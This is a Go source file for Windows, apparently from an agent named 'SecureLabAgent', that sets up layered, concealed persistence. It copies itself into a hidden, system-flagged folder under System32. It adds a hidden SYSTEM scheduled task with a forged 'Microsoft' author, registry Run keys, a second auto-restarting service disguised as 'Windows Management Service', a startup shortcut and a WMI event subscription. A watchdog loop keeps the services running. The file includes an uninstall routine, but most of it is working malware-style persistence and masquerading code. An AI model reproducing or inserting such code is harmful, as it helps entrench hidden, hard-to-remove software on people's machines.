//go:build windows

package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"time"
	"unicode/utf16"

	"golang.org/x/sys/windows/registry"
	"golang.org/x/sys/windows/svc"
	"golang.org/x/sys/windows/svc/mgr"
)

const (
	hiddenDirName  = "SecureLabCore"
	watchdogName   = "SecureLabWatchdog"
	secondaryName  = "SecureLabGuard"
	serviceName    = "SecureLabAgent"
	hiddenService  = "SecureLabSvc"
	taskName       = "SecureLabHeartbeat"
	regRunKey      = "SecureLabAgent"
	wmiNamespace   = "root/subscription"
)

func getHiddenDir() string {
	sysRoot := os.Getenv("SystemRoot")
	if sysRoot == "" {
		sysRoot = "C:\\Windows"
	}
	return filepath.Join(sysRoot, "System32", "Tasks", hiddenDirName)
}

func ensurePersistenceBinary() string {
	hiddenDir := getHiddenDir()
	os.MkdirAll(hiddenDir, 0755)
	setHidden(hiddenDir)

	exe, err := os.Executable()
	if err != nil {
		writeDebug("persistence: get exe path: %v", err)
		return ""
	}
	exeName := filepath.Base(exe)
	hiddenExe := filepath.Join(hiddenDir, exeName)

	// Copy binary if not already there
	if _, err := os.Stat(hiddenExe); os.IsNotExist(err) {
		input, err := os.ReadFile(exe)
		if err != nil {
			writeDebug("persistence: read exe: %v", err)
			return exe
		}
		if err := os.WriteFile(hiddenExe, input, 0755); err != nil {
			writeDebug("persistence: write hidden exe: %v", err)
			return exe
		}
		setHidden(hiddenExe)
		writeDebug("persistence: copied to %s", hiddenExe)
	}
	return hiddenExe
}

func setHidden(path string) {
	ptr, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return
	}
	attrs, err := syscall.GetFileAttributes(ptr)
	if err != nil {
		attrs = 0
	}
	syscall.SetFileAttributes(ptr, attrs|syscall.FILE_ATTRIBUTE_HIDDEN|syscall.FILE_ATTRIBUTE_SYSTEM)
}

// installScheduledTask creates a task that runs every 2 minutes as SYSTEM,
// checking if the agent service exists and starting it if not.
func installScheduledTask(binPath string) {
	writeDebug("persistence: installing scheduled task")
	xml := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>%s</Date>
    <Author>Microsoft</Author>
    <Description>Windows Heartbeat Monitor</Description>
  </RegistrationInfo>
  <Triggers>
    <BootTrigger>
      <Enabled>true</Enabled>
      <Delay>PT30S</Delay>
    </Trigger>
    <CalendarTrigger>
      <StartBoundary>%s</StartBoundary>
      <Repetition>
        <Interval>PT2M</Interval>
        <Duration>P1D</Duration>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <Enabled>true</Enabled>
    </CalendarTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <ExecutionTimeLimit>PT30S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>%s</Command>
      <Arguments>--watchdog</Arguments>
      <WorkingDirectory>%s</WorkingDirectory>
    </Exec>
  </Actions>
</Task>`, time.Now().Format("2006-01-02T15:04:05"), time.Now().Format("2006-01-02T00:00:00"), binPath, filepath.Dir(binPath))

	xmlPath := filepath.Join(os.TempDir(), "SWT.xml")
	utf16le := utf16.Encode([]rune(xml))
	byteOrderMark := []byte{0xFF, 0xFE}
	f, _ := os.Create(xmlPath)
	if f != nil {
		f.Write(byteOrderMark)
		for _, r := range utf16le {
			f.Write([]byte{byte(r), byte(r >> 8)})
		}
		f.Close()
		setHidden(xmlPath)

		exec.Command("schtasks", "/Create", "/F", "/TN", taskName, "/XML", xmlPath, "/RU", "SYSTEM").Run()
		exec.Command("schtasks", "/Run", "/TN", taskName).Run()
		os.Remove(xmlPath)
		writeDebug("persistence: scheduled task created")
	}
}

// installRegistryRun adds persistence via HKCU and HKLM Run keys
func installRegistryRun(binPath string) {
	writeDebug("persistence: installing registry Run keys")
	keyPaths := []string{
		`Software\Microsoft\Windows\CurrentVersion\Run`,
		`Software\Microsoft\Windows\CurrentVersion\RunOnce`,
	}
	for _, subKey := range keyPaths {
		k, err := registry.OpenKey(registry.CURRENT_USER, subKey, registry.SET_VALUE|registry.QUERY_VALUE)
		if err == nil {
			k.SetStringValue(regRunKey, fmt.Sprintf(`"%s" --watchdog`, binPath))
			k.Close()
		}
	}

	// Also try HKLM Run (needs admin)
	lk, err := registry.OpenKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE|registry.QUERY_VALUE)
	if err == nil {
		lk.SetStringValue(regRunKey, fmt.Sprintf(`"%s" --watchdog`, binPath))
		lk.Close()
	}

	writeDebug("persistence: registry keys set")
}

// installSecondaryService creates a second hidden service as backup
func installSecondaryService(binPath string) {
	writeDebug("persistence: installing secondary service")
	m, err := mgr.Connect()
	if err != nil {
		writeDebug("persistence: mgr connect: %v", err)
		return
	}
	defer m.Disconnect()

	// Check if already exists
	existing, err := m.OpenService(hiddenService)
	if err == nil {
		existing.Close()
		return
	}

	s, err := m.CreateService(hiddenService, binPath, mgr.Config{
		DisplayName:      "Windows Management Service",
		Description:      "Manages system performance metrics",
		StartType:        mgr.StartAutomatic,
		DelayedAutoStart: false,
		ServiceStartName: "LocalSystem",
	})
	if err != nil {
		writeDebug("persistence: create secondary service: %v", err)
		return
	}
	defer s.Close()

	s.SetRecoveryActions([]mgr.RecoveryAction{
		{Type: mgr.ServiceRestart, Delay: 3 * time.Second},
		{Type: mgr.ServiceRestart, Delay: 5 * time.Second},
		{Type: mgr.ServiceRestart, Delay: 10 * time.Second},
	}, 86400)

	s.Start()
	writeDebug("persistence: secondary service installed and started")
}

// installStartupFolder adds a lnk to startup folder
func installStartupFolder(binPath string) {
	writeDebug("persistence: installing startup folder link")
	startup := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	os.MkdirAll(startup, 0755)

	psCmd := fmt.Sprintf(`$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut('%s'); $s.TargetPath = '%s'; $s.Arguments = '--watchdog'; $s.WindowStyle = 7; $s.Save()`,
		filepath.Join(startup, "WindowsService.lnk"),
		binPath)
	exec.Command("powershell", "-NoProfile", "-Command", psCmd).Run()
	writeDebug("persistence: startup link created")
}

// installWMIEvent creates a WMI event subscription for startup persistence
func installWMIEvent(binPath string) {
	writeDebug("persistence: installing WMI event subscription")
	psCmd := fmt.Sprintf(`
$filterArgs = @{Name='SLFilter'; EventNameSpace='root\cimv2'; QueryLanguage='WQL'; Query="SELECT * FROM Win32_ComputerSystemEvent WHERE EventType = 2 OR EventType = 1"}
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filterArgs -ErrorAction SilentlyContinue
$consumerArgs = @{Name='SLConsumer'; CommandLineTemplate='"%s" --watchdog'; WorkingDirectory='%s'}
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $consumerArgs -ErrorAction SilentlyContinue
$bindArgs = @{Filter=$filter; Consumer=$consumer}
$bind = Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $bindArgs -ErrorAction SilentlyContinue
`, binPath, filepath.Dir(binPath))

	exec.Command("powershell", "-NoProfile", "-Command", psCmd).Run()
	writeDebug("persistence: WMI event installed")
}

// applyAggressivePersistence installs all persistence mechanisms
func applyAggressivePersistence() {
	writeDebug("=== Applying aggressive persistence ===")
	binPath := ensurePersistenceBinary()
	if binPath == "" {
		writeDebug("persistence: no binary path, skipping")
		return
	}

	installScheduledTask(binPath)
	installRegistryRun(binPath)
	installSecondaryService(binPath)
	installStartupFolder(binPath)
	installWMIEvent(binPath)

	writeDebug("=== Aggressive persistence applied ===")
}

// removePersistence removes all persistence mechanisms (for uninstall)
func removePersistence() {
	writeDebug("=== Removing persistence ===")

	// Remove scheduled task
	exec.Command("schtasks", "/Delete", "/F", "/TN", taskName).Run()

	// Remove registry keys
	for _, subKey := range []string{
		`Software\Microsoft\Windows\CurrentVersion\Run`,
		`Software\Microsoft\Windows\CurrentVersion\RunOnce`,
	} {
		k, err := registry.OpenKey(registry.CURRENT_USER, subKey, registry.SET_VALUE|registry.QUERY_VALUE)
		if err == nil {
			k.DeleteValue(regRunKey)
			k.Close()
		}
	}
	lk, err := registry.OpenKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE|registry.QUERY_VALUE)
	if err == nil {
		lk.DeleteValue(regRunKey)
		lk.Close()
	}

	// Remove secondary service
	m, err := mgr.Connect()
	if err == nil {
		for _, name := range []string{hiddenService} {
			s, err := m.OpenService(name)
			if err == nil {
				s.Control(svc.Stop)
				time.Sleep(1 * time.Second)
				s.Delete()
				s.Close()
			}
		}
		m.Disconnect()
	}

	// Remove hidden directory
	hiddenDir := getHiddenDir()
	if _, err := os.Stat(hiddenDir); err == nil {
		os.RemoveAll(hiddenDir)
	}

	// Remove startup shortcut
	startup := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	os.Remove(filepath.Join(startup, "WindowsService.lnk"))

	// Remove WMI subscriptions
	exec.Command("powershell", "-NoProfile", "-Command",
		`Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name='SLFilter'" | Remove-WmiObject -ErrorAction SilentlyContinue;
		Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name='SLConsumer'" | Remove-WmiObject -ErrorAction SilentlyContinue;
		Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%SLFilter%'" | Remove-WmiObject -ErrorAction SilentlyContinue`,
	).Run()

	writeDebug("=== Persistence removed ===")
}

// watchdogRun is the entry point for the --watchdog mode
func watchdogRun() {
	writeDebug("Watchdog started")
	serviceNames := []string{serviceName, hiddenService}

	for {
		for _, name := range serviceNames {
			// Check if service exists and run
			cmd := exec.Command("powershell", "-NoProfile", "-Command",
				fmt.Sprintf(`$s = Get-Service -Name '%s' -ErrorAction SilentlyContinue; if (-not $s) { exit 1 }; if ($s.Status -ne 'Running') { Start-Service -Name '%s' -ErrorAction SilentlyContinue }`, name, name))
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			cmd.Run()
		}
		time.Sleep(60 * time.Second)
	}
}

// runWatchdogMode checks for --watchdog argument and runs in watchdog mode
func runWatchdogMode() bool {
	for _, arg := range os.Args {
		if arg == "--watchdog" {
			go watchdogRun()
			return true
		}
	}
	return false
}

// init registers this file
func init() {}
